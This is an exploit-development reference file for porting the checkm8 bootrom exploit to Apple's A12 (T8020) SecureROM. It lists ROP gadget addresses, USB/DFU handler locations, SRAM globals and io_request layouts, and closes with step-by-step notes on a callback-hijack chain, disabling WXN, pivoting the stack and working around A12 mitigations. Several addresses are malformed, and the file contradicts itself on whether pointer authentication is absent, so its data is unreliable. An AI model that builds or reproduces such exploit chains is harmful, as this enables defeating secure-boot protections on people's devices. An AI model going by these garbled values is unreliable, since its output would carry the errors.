# T8020 (A12) SecureROM Gadget Database — checkm8 Exploit Configuration
# ======================================================================
# Chip: T8020 B1 (Apple A12 Bionic)
# Device: iPhone XR (CPID:0x8020, BDID:0x0C)
# SecureROM: iBoot-3865.0.0.4.7
# Binary: t8020_B1_securerom.bin (524,288 bytes)
# ROM Base: 0x100000000
# 
# Reversed from: Static analysis of 512KB SecureROM dump
# Cross-referenced with: T8010/T8015 gadgets from ipwndfu checkm8.py
# Analysis date: 2025-07-01
# Status: FIRST PUBLIC T8020 GADGET DATABASE
# ======================================================================

## Memory Map

```
ROM:        0x100000000 - 0x100080000  (512KB, code ends ~0x100020000)
SRAM:       0x19C000000 - 0x19C020000  (estimated 128KB)
Stack:      loaded from ROM constants at 0x100000368/0x100000370
Exception:  VBAR_EL1 = 0x100000800
Heap Pool1: referenced near 0x19C011000+0xE88
Heap Pool2: referenced near 0x19C011000+0x468
DFU Load:   0x19C018800
Heap Base:  0x19C0D8000  (from device SRTG)
```

## ROP Gadgets

### Critical Exploit Gadgets (equivalent to T8010 checkm8.py)

```
T8020 Address       T8010 Ref       Gadget Description
-------------------------------------------------------------------
0x100002BA0         0x10000CC6C     nop_gadget: ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
                                    (96 instances — most common epilogue)
0x10000A444         0x10000CC4C     func_gadget (callback dispatch): ldp x8,x9,[x0,#0x70]
                                    NOTE: T8020 uses (x8,x9) not (x8,x10) like T8010!
0x10000B9F0         —               func_gadget site 2 (usb_core_complete_endpoint_io context)
0x1000004A8         0x1000003E4     write_ttbr0: msr ttbr0_el1, x0; isb; ret
0x10000053C         0x100000478     dmb_ret: dmb sy; ret
0x10000044C         —               write_sctlr: msr sctlr_el1, x0 (then configures cntkctl, ret)
                                    Use for WXN disable: clear bit 19 in x0 before calling
0x100000464         —               read_sctlr: mrs x0, sctlr_el1; ret
0x10000046C         —               write_sctlr_loop: msr sctlr_el1, x0; dsb sy; isb; 
                                    then ORR WXN+enable, branch if changed (stabilizer loop)
```

### Register Control Gadgets

```
0x100005470     mov x0, #0; ret             (10 instances)
0x10000B4B0     mov x8, #0; mov x0, x8; ret
0x10000B4B4     mov x0, x8; ret             (5 instances)
0x1000017B74    mov x0, #-1; ret            (2 instances)
0x100015CD0     mov x0, xzr; ret            (2 instances)
0x100015D10     mov x0, #-2; ret
0x100015D18     mov x0, #-3; ret
0x1001A0F8      mov x0, x6; ret
```

### Stack Pivot / Frame Gadgets

```
0x100011130     mov sp, x9; ret             *** CRITICAL: arbitrary stack pivot ***
0x100002BA0     ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret  (96x)
0x100002764     ldp x29,x30,[sp],#0x10; ret                          (75x)
0x100015854     ldp x19,x20,[sp],#0x10; ldp x29,x30,[sp],#0x10; ret
0x100002260     add sp, sp, #0x30; ret      (20x)
0x10000030A4    add sp, sp, #0x40; ret      (16x)
0x100009058     add sp, sp, #0x50; ret      (14x)
0x100002694     add sp, sp, #0x70; ret      (13x)
0x1000021D8     add sp, sp, #0x60; ret      (12x)
0x100002AC8     add sp, sp, #0x20; ret      (10x)
```

### Memory Write Gadgets

```
0x100009860     str x1, [x0]; ret           *** ARBITRARY 64-BIT WRITE ***
0x100009538     stp xzr, xzr, [x0]; ret    (zero 16 bytes at [x0])
0x100011B1C     str x1, [x0]; ret           (duplicate)
0x10000CDC8     str x1, [x0, #0x40]; ret
0x100002AF8     str w9, [x8]; ret           (32-bit write, 6x)
0x100000690     str x8, [x1]; ret
0x100009968     str w1, [x0, #4]; ret
```

### Memory Read Gadgets

```
read_sctlr:  0x100000464  mrs x0, sctlr_el1; ret
read_ttbr0:  (find equivalent — mrs x0, ttbr0_el1; ret)
```

### System Register Gadgets

```
0x100000048     msr vbar_el1, x10           (reset exception vectors)
0x100000548     msr daifset, #3             (disable IRQ+FIQ = enter_critical)
0x1000003A8     msr daifclr, #4             (enable IRQ = exit_critical)
0x100000590     msr daifset, #3             (enter_critical, alternate site)
0x1000005A4     msr daifclr, #3             (exit_critical, alternate site)
0x100007640     msr daifset, #0xf           (disable ALL exceptions)
0x10000003C     msr daifset, #0xf           (disable ALL, ROM entry site)
0x10000AAF4     msr tpidr_el0, x0; ret      (thread pointer)
0x10000045C     msr cntkctl_el1, x0; ret    (timer config)
0x100000490     msr mair_el1, x0; isb; ret  (memory attributes)
0x10000049C     msr tcr_el1, x0; isb; ret   (translation control)
0x1000004BC     msr cpacr_el1, x0; isb; ret (coprocessor access)
```

## USB Infrastructure Functions

```
Function                    Address         Description
------------------------------------------------------------------------
usb_init                    0x10000D3FC     Main USB initialization (power, serial, descriptors)
usb_controller_init         0x10000C3A4     OTG controller hardware setup
usb_register_interface      0x10000D924     Register USB interface with handlers
usb_core_do_io              0x10000B558     USB I/O request setup (estimated — STP callback at +0x70)
usb_core_complete_ep_io     0x10000B858     Endpoint I/O completion + callback dispatch
usb_transfer_submit         0x10000E92C     Submit transfer to hardware
usb_create_string_desc      0x10000D368     Create USB string descriptor
usb_serial_number_build     0x10000D514     Build serial number string
get_descriptor_handler      0x10000DCC8     USB GET_DESCRIPTOR with jump table at 0x10000DF5C
vid_setup                   0x10000D440     MOV w0, #0x5AC (at 0x100011F14)
```

## DFU Functions

```
Function                    Address         Description
------------------------------------------------------------------------
dfu_init                    0x10000E2D0     DFU interface initialization
dfu_request_handler         0x10000E3EC     DFU class request dispatcher (DNLOAD/GETSTATUS/etc)
dfu_completion_callback     0x10000E708     DFU transfer completion
dfu_state_setup             0x10000D0A8     Install/clear DFU vtable (0x78 bytes → gDFU_state)
dfu_callback_dispatch       0x10000D100     Trampoline: load func ptr from gDFU+offset, BR X0

DFU Request Dispatch (at 0x10000E3EC):
  bRequest=1 (DNLOAD):    accepts up to 0x800 bytes (check: cmp w0, #0x801; b.lo)
  bRequest=3 (GETSTATUS):  return status struct
  bRequest=4 (CLRSTATUS):  reset DFU state
  bRequest=5 (GETSTATE):   return state byte
  bRequest=6 (ABORT):      reset to dfuIDLE
```

## SRAM Global Variables

```
Address             Size    Refs    Identity (confirmed/hypothesized)
------------------------------------------------------------------------
0x19C010B20         ~0x40   23      gUSBDescriptors / gUSBDeviceState
                                    +0x30: serial string pointer
                                    +0x38: descriptor buffer (0x100 bytes)
0x19C0088F0         ~0x20   —       gUSBSerialNumber (chip identity buffer)
                                    +0x0A: serial string data start
                                    +0x12: ECID
                                    +0x14: chip revision
                                    +0x16: board ID
                                    +0x18: security epoch
                                    +0x19: security domain
                                    +0x1A: production status
0x19C010A90         0x78    14      gDFU_state (vtable-style handler table)
                                    +0x08: handler slot 1 (function pointer → BR X0)
                                    +0x10: handler slot 2
                                    +0x18: handler slot 3
                                    +0x20: handler slot 4
                                    +0x28: handler slot 5
                                    +0x38: handler slot 6
0x19C010BE0         ~0x30   12      gDFU_interface / gUSBEndpointState
                                    +0x01: busy flag
                                    +0x04: config flags
                                    +0x14: DFU state
                                    +0x15: DFU substate (0x32 = timeout value?)
                                    +0x20: endpoint handle
                                    +0x28: DFU download buffer ptr (0x800 bytes)
0x19C010670         ~0x80   16      gUSB_interface_table
                                    +0x04: interface flags (ORR #2 = enabled)
                                    +0x20: interface descriptor ptr
                                    +0x28: interface alt descriptor ptr
                                    +0x7C: per-alt-setting flag (offset via w24*0x50)
0x19C00C1B0         ~0x20   12      gUSB_controller_config
                                    +0x04: control word (0x202C0000)
                                    +0x06: ready flag (bit 0)
                                    +0x10: DMA/MMIO base
0x19C008000         varies   8      SRAM general area
                                    +0xB40: boot flag (checked in early init)
                                    +0x448: stack canary / security cookie
0x19C00BBC0         ~0x10    6      USB endpoint config 1 (byte fields at +0, +2)
0x19C00BBF0         ~0x18    6      USB endpoint config 2 (array, stride 0x18)
0x19C00BC20         ~0x28    6      USB interface handler vtable
                                    +0x10: handler func ptr → BLR X8
                                    +0x18: handler func ptr → BLR X8
                                    +0x20: handler func ptr → BLR X8
0x19C010630         varies   6      DART/IOMMU page table base array
0x19C008B48         —        5      Interrupt controller state (stride 0x18)
0x19C010B18         ~0x08    5      USB transfer size limits
                                    +0x04: max packet (halfword)
                                    +0x06: max transfer (halfword)
0x19C00BDA0         varies   varies  Panic/debug state
```

## Memory Management

```
malloc      = 0x10000F1EC   (14 calls) — heap_alloc(size, alignment)
calloc      = 0x10000F3B0   — calloc(count, size) → mul; b malloc
free        = 0x10000F468   (18 calls) — heap_free(ptr)
memalign    = 0x10000F680   — aligned allocation (used for DFU buffer)
dma_alloc   = 0x1000113B4   — DMA/physically-contiguous allocation
memcpy      = 0x100010BD0   (76 calls) — optimized with LDP/STP, LDNP/STNP
memset      = 0x100010E00   (14 calls) — memset(ptr, val, size)
printf      = 0x100008978   (136 calls) — debug printf (panic depth counter at SRAM+0xDA0)
```

## io_request Struct Layout (T8020)

```
Offset  Size    Field               T8010 Equivalent
------  ----    -----               ----------------
+0x00   8       next                same
+0x08   8       prev                same
+0x10   8       endpoint            same (zeroed in init)
+0x18   8       io_buffer           same (zeroed in init)
+0x20   8       io_length           same (zeroed in init)
+0x28   8       status              same
+0x30   8       completion_context  same (zeroed in init)
+0x38   8       (reserved)          
...
+0x70   8       callback            CONFIRMED (ldp x8,x9,[x0,#0x70])
+0x78   8       callback_arg/next   CONFIRMED (loaded as x9 on T8020 vs x10 on T8010)
...
+0x80   4       endpoint_number     
+0x88   8       endpoint_handle
+0x94   8       transfer_params     (w3,w8 loaded as pair, multiplied for size)
```

**CRITICAL — CALLBACK DISPATCH CONFIRMED (both sites identical)**:
```asm
ldp  x8, x9, [x0, #0x70]    ; x8 = io_request+0x70 (arg), x9 = io_request+0x78 (func)
mov  x0, x8                   ; pass arg as first parameter
blr  x9                       ; CALL function pointer from +0x78
cmp  w0, #0                   ; check return value
```

- T8010: `ldp x8, x10, [x0, #0x70]` → BLR x10 (func at +0x78, arg at +0x70)
- T8020: `ldp x8, x9, [x0, #0x70]` → BLR x9  (func at +0x78, arg at +0x70)
- **Same semantics, different register** (x9 instead of x10)
- io_request+0x70 = callback argument (passed as x0)
- io_request+0x78 = callback function pointer (called via BLR)

**PAC STATUS: NONE — CONFIRMED**
- Zero PACIASP/AUTIASP instructions in entire ROM
- Zero PACIA/AUTIA/PACIB/AUTIB/BRAA/BLRAA instructions
- Return addresses on stack are NOT authenticated
- Function pointers are NOT signed
- **ROP chains work exactly like on T8010 — no PAC bypass needed!**

## Exploit Strategy Notes

### WXN Disable Chain
1. Read SCTLR_EL1: `0x100000464` (mrs x0, sctlr_el1; ret)
2. Clear WXN bit (bit 19): need to AND with ~(1<<19) = ~0x80000
3. Write SCTLR_EL1: `0x10000044C` (msr sctlr_el1, x0; then cntkctl side-effects, ret)
4. After WXN cleared, SRAM becomes executable

### Callback Chain (checkm8 style)
1. Overwrite io_request at offset +0x70 with ROP gadget address
2. Overwrite +0x78 with next io_request (or shellcode address)
3. USB reset triggers usb_core_complete_endpoint_io → LDP x8,x9,[x0,#0x70] → BLR x9
4. Chain: nop_gadget → func_gadget → write_sctlr → shellcode

### Stack Pivot
- `0x100011130`: mov sp, x9; ret — pivot to controlled buffer in SRAM
- Place ROP chain at known SRAM address (e.g., DFU load buffer at 0x19C018800)

### A12-Specific Challenges
1. **PAC (Pointer Authentication)**: A12 has PAC. However, SecureROM may not use PAC 
   for all pointers. Need to check if io_request callbacks are PAC-protected.
   - No PACIA/AUTIA instructions found near callback dispatch → likely NOT PAC-protected in ROM
2. **DWC3 USB controller**: T8020 uses DWC3 instead of DWC2 (T8010)
   - Different register layout, different endpoint management
   - The USB stall/leak/no_leak primitives may need adaptation
3. **Double-abort mitigation**: A12 resets the USB stack on two consecutive 
   DFU_ABORT commands, preventing the ZLP leak technique
   - Must use alternative heap feng-shui (possibly STALL-based only)

## Comparison: T8010 vs T8020

```
                        T8010 (A10)         T8020 (A12)
                        -----------         -----------
ROM base                0x100000000         0x100000000
SRAM base               0x180000000         0x19C000000
nop_gadget              0x10000CC6C         0x100002BA0
func_gadget             0x10000CC4C         0x10000A444
func_gadget regs        (x8, x10)           (x8, x9)
USB_CORE_DO_IO          0x10000DC98         0x10000B558 (est.)
gUSBDescriptors         0x180088A30         0x19C010B20
gUSBSerialNumber        0x180083CF8         0x19C0088F0
LOAD_ADDRESS            0x1800B0000         0x19C018800
write_ttbr0             0x1000003E4         0x1000004A8
dc_civac                0x10000046C         (not found — different encoding?)
dmb_ret                 0x100000478         0x10000053C
malloc                  (not published)     0x10000F1EC
free                    (not published)     0x10000F468
io_request.callback     +0x70               +0x70 (SAME)
io_request.next         +0x78               +0x78 (SAME)
USB controller          DWC2 (Synopsys)     DWC3 (Synopsys)
PAC support             No                  Yes (but ROM callbacks may not use it)
```
